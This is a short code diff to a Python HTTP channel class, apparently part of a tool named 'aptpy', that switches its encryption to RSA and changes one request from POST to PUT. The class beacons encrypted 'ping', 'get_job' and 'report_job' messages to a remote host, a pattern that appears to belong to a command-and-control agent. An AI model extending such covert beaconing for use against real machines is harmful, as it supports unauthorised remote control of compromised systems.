@@ -2,7 +2,7 @@ import requests
 import sqlite3
 from abstract import AbstractChannel
 from json import dumps
-from lib.encrypt import encrypt, decrypt
+from lib.encrypt import RSAencrypt, RSAdecrypt
 from logging import getLogger
 from os.path import exists as file_exists
 
@@ -23,13 +23,13 @@ class HttpChannel(AbstractChannel):
 
         try:
             data = dumps({'task': 'ping', 'client_id': self.client_id})
-            encrypted = encrypt(data)
+            encrypted = RSAencrypt(data)
             cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}
 
-            response = requests.post(self._remote_host,
-                                     json=[encrypted['data'], encrypted['sign']],
-                                     cookies=cookies
-                                     )
+            response = requests.put(self._remote_host,
+                                    json=[encrypted['data'], encrypted['sign']],
+                                    cookies=cookies
+                                    )
 
             if response.status_code != 200:
                 getLogger('aptpy').debug("[HTTP] We can't connect to the remote server")
@@ -66,7 +66,7 @@ class HttpChannel(AbstractChannel):
 
         try:
             data = dumps({'task': 'report_job', 'client_id': self.client_id, 'reports': reports})
-            encrypted = encrypt(data)
+            encrypted = RSAencrypt(data)
             cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}
 
             response = requests.post(self._remote_host,
@@ -94,7 +94,7 @@ class HttpChannel(AbstractChannel):
 
         try:
             data = dumps({'task': 'get_job', 'client_id': self.client_id})
-            encrypted = encrypt(data)
+            encrypted = RSAencrypt(data)
             cookies = {'XDEBUG_SESSION': 'PHPSTORM'} if self.debug else {}
 
             response = requests.post(self._remote_host,
